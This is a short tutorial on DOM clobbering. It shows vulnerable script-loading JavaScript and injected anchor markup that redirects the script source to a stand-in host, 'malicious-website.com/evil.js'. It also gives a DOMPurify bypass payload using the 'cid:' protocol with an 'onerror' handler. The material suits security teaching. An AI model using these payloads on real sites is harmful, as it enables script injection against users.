# DOM Clobbering

## Overview

DOM clobbering is a technique used to manipulate the Document Object Model (DOM) of a webpage through injected HTML. 
This can alter the behavior of JavaScript running on the page. 
DOM clobbering is particularly useful in environments where Cross-Site Scripting (XSS) attacks are not feasible but the attacker can still control some HTML content, 
especially when `id` or `name` attributes are not properly sanitized by HTML filters.

## Example of Vulnerable JavaScript Code

Consider the following JavaScript code that dynamically loads a script based on a URL stored in an object:

```
<script>
    window.onload = function() {
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```
## HTML Injection for DOM Clobbering

An attacker can inject HTML to overwrite the someObject with an anchor element, exploiting the fact that the same id can be used more than once:
```
<a id="someObject"></a>
<a id="someObject" name="url" href="//malicious-website.com/evil.js"></a>
```
In this scenario, using the same ID twice causes the DOM to treat these anchors as a collection under someObject.
The name attribute in the second anchor (url) effectively overwrites the property of someObject that the JavaScript intends to use for a script source, redirecting it to a malicious script.

# DOMPurify Bypass

DOMPurify allows the cid: protocol, which does not URL-encode double quotes. This can be exploited to inject malicious payloads:
```
<a id="yourID" name="yourName" href='cid:"onerror=alert(1)//'></a>
```
In this example, an encoded double quote is injected and decoded at runtime, potentially leading to script execution when processed by the browser.
